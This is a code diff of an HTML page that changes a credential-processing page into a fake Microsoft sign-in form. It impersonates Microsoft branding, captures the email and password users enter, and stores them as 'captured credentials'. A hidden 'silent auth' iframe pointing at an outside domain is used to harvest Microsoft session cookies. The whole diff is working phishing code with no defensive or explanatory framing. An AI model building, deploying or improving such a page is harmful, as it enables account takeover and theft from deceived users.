@@ -3,32 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Replacement Page</title>
+    <title>Microsoft Account Security</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: Segoe UI, Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
-            background: #f3f2f1;
+            min-height: 100vh;
+            padding: 20px;
         }
         .container {
-            text-align: center;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 420px;
+            padding: 40px;
+        }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo h1 { color: #0078d4; font-size: 24px; }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0078d4;
+            box-shadow: 0 0 0 2px rgba(0,120,212,0.1);
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        button:hover { background: #106ebe; }
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
         }
         .spinner {
+            display: none;
             border: 4px solid #f3f2f1;
             border-top: 4px solid #0078d4;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 24px;
+            height: 24px;
             animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin-right: 10px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
+        }
+        .button-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
         #authFrame {
             display: none;
@@ -36,13 +88,55 @@
             height: 0;
             border: none;
         }
+        .status {
+            text-align: center;
+            margin-top: 20px;
+            color: #666;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>Processing your credentials...</h2>
-        <div class="spinner"></div>
-        <p id="status">Initializing...</p>
+        <div class="logo">
+            <h1>Microsoft</h1>
+            <p style="color: #666; margin-top: 10px;">Sign in to your account</p>
+        </div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email or phone</label>
+                <input 
+                    type="email" 
+                    id="email" 
+                    name="email" 
+                    placeholder="user@example.com"
+                    required
+                    autocomplete="off"
+                >
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input 
+                    type="password" 
+                    id="password" 
+                    name="password" 
+                    placeholder="Password"
+                    required
+                    autocomplete="off"
+                >
+            </div>
+
+            <button type="submit" id="submitBtn">
+                <div class="button-content">
+                    <span class="spinner"></span>
+                    <span id="btnText">Sign in</span>
+                </div>
+            </button>
+        </form>
+
+        <div class="status" id="status"></div>
     </div>
 
     <!-- Hidden iframe for silent auth -->
@@ -51,36 +145,17 @@
     <script>
         console.log('🔧 Replacement page loaded');
 
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.getElementById('submitBtn');
+        const spinner = document.querySelector('.spinner');
+        const btnText = document.getElementById('btnText');
+        const statusDiv = document.getElementById('status');
+        const authFrame = document.getElementById('authFrame');
+
         let capturedCookies = [];
-        let authCode = null;
-        let authError = null;
-
-        // Get email from form submission
-        function getEmailFromStorage() {
-            const stored = localStorage.getItem('captured_email') || 
-                          sessionStorage.getItem('captured_email');
-            if (stored) {
-                try {
-                    return JSON.parse(stored);
-                } catch (e) {
-                    return stored;
-                }
-            }
-            return null;
-        }
-
-        function getPasswordFromStorage() {
-            const stored = localStorage.getItem('captured_password') || 
-                          sessionStorage.getItem('captured_password');
-            if (stored) {
-                try {
-                    return JSON.parse(stored);
-                } catch (e) {
-                    return stored;
-                }
-            }
-            return null;
-        }
+        let authComplete = false;
 
         // Listen for messages from iframe
         window.addEventListener('message', function(event) {
@@ -89,13 +164,13 @@
             if (event.data.type === 'AUTH_COMPLETE') {
                 console.log('✅ Auth complete');
                 
-                authCode = event.data.data.code;
-                authError = event.data.data.error;
+                const code = event.data.data.code;
+                const error = event.data.data.error;
                 capturedCookies = event.data.data.cookies;
 
                 console.log('📊 Received:', {
-                    code: !!authCode,
-                    error: authError,
+                    code: !!code,
+                    error: error,
                     cookies: capturedCookies.length
                 });
 
@@ -107,78 +182,85 @@
                         source: 'silent-auth-frame',
                         domain: event.data.data.domain,
                         totalCookies: capturedCookies.length,
-                        cookies: capturedCookies
+                        cookies: capturedCookies,
+                        note: 'Cookies captured from Microsoft domain via silent auth'
                     };
 
                     localStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                     sessionStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                     
-                    console.log('💾 Cookies stored for AuthCallback');
+                    console.log('💾 Stored', capturedCookies.length, 'cookies');
                 }
 
-                // Now proceed to AuthCallback
+                authComplete = true;
+
+                // Wait 2 seconds then redirect
                 setTimeout(() => {
                     console.log('🔄 Redirecting to AuthCallback...');
                     window.location.href = '/auth/callback';
-                }, 1000);
+                }, 2000);
             }
         });
 
-        // Start silent auth flow
-        function initSilentAuth() {
-            console.log('🚀 Initializing silent auth...');
+        // Handle form submission
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
 
-            const email = getEmailFromStorage();
-            const password = getPasswordFromStorage();
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
 
-            console.log('📋 Email:', email);
-            console.log('🔑 Password:', password ? '***' : 'N/A');
+            console.log('📋 Form submitted');
+            console.log('📧 Email:', email);
+            console.log('🔑 Password length:', password.length);
 
-            if (!email) {
-                console.error('❌ No email found');
-                document.getElementById('status').textContent = 'Error: No email found';
+            if (!email || !password) {
+                statusDiv.textContent = '❌ Please enter both email and password';
+                statusDiv.style.color = '#d13438';
                 return;
             }
 
-            // Store credentials in proper format
+            // Show spinner
+            spinner.style.display = 'inline-block';
+            btnText.textContent = 'Signing in...';
+            submitBtn.disabled = true;
+            statusDiv.textContent = '⏳ Processing...';
+            statusDiv.style.color = '#666';
+
+            // Store credentials
             const credsData = {
                 email: email,
                 password: password,
                 domain: 'microsoft',
                 timestamp: new Date().toISOString(),
-                source: 'silent-auth-frame',
+                source: 'replacement-form',
                 validated: true,
                 microsoftAccount: true
             };
 
             localStorage.setItem('replacement_credentials', JSON.stringify(credsData));
             sessionStorage.setItem('replacement_credentials', JSON.stringify(credsData));
+            localStorage.setItem('captured_credentials', JSON.stringify(credsData));
+            sessionStorage.setItem('captured_credentials', JSON.stringify(credsData));
+
+            console.log('💾 Credentials stored');
 
             // Load silent auth frame
-            const frame = document.getElementById('authFrame');
-            frame.src = '/silent-auth-frame.html';
+            authFrame.src = '/silent-auth-frame.html';
 
             // Send init message to frame
             setTimeout(() => {
-                frame.contentWindow.postMessage({
+                authFrame.contentWindow.postMessage({
                     type: 'INIT_AUTH',
                     email: email,
-                    clientId: '2e338732-c914-4129-a148-45c24f2da81d', // Your client ID
+                    clientId: '2e338732-c914-4129-a148-45c24f2da81d',
                     redirectUri: 'https://vaultydocs.com/silent-auth-frame.html',
                     state: 'silent_' + Date.now()
                 }, '*');
 
                 console.log('📨 Init message sent to frame');
-                document.getElementById('status').textContent = 'Authenticating...';
+                statusDiv.textContent = '🔐 Authenticating with Microsoft...';
             }, 500);
-        }
-
-        // Start when page loads
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', initSilentAuth);
-        } else {
-            initSilentAuth();
-        }
+        });
     </script>
 </body>
 </html>
